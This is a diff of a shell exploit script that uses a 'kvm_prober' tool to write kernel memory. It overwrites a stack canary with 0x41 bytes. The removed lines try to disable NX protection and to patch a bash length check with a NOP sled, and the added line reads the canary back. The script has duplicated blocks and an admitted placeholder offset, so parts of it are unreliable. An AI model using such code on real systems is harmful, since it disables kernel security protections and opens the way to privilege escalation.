@@ -100,37 +100,9 @@ echo "kvm_prober writekvmem $CANARY_ADDR AAAAAAAAAA"
 kvm_prober writekvmem $CANARY_ADDR 41414141414141414141
 
 sleep 5
-# Disable NX protection (if needed)
-NX_ADDR=$(grep -m1 nx /proc/kallsyms | awk '{print $1}')
-echo "kvm_prober writekvmem $NX_ADDR AAAAAAAAAA"
-kvm_prober writekvmem $NX_ADDR 41414141414141414141
-
-sleep 5
-# Disable NX protection (if needed)
-NX_ADDR=$(grep -m1 nx /proc/kallsyms | awk '{print $1}')
-echo "kvm_prober writekvmem $NX_ADDR AAAAAAAAAA"
-kvm_prober writekvmem $NX_ADDR 41414141414141414141
-
-
-sleep 5
-# Find the secure_getenv function in bash
-BASH_BASE=$(ldd /bin/bash | grep libc.so | awk '{print $3}' | xargs nm -D | grep " T _start" | awk '{print $1}')
-echo $BASH_BASE
-
-sleep 5
-# Calculate address of the environment length check
-echo "CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary"
-CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary
-
-sleep 5
-# Calculate address of the environment length check
-echo "CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary"
-CHECK_ADDR=$(printf "0x%lx" $((0x$BASH_BASE + 0x12345)))  # Actual offset may vary
-
-sleep 5
-# Patch with NOP sled to bypass length check
-echo "kvm_prober writekvmem $CHECK_ADDR 90909090909090909090"
-kvm_prober writekvmem $CHECK_ADDR 90909090909090909090
+# Check if stack canary protection is zeros
+echo "kvm_prober readkvmem $CANARY_ADDR 64"
+kvm_prober readkvmem $CANARY_ADDR 64
 
 sleep 5
 echo "[*] Write flags default value"
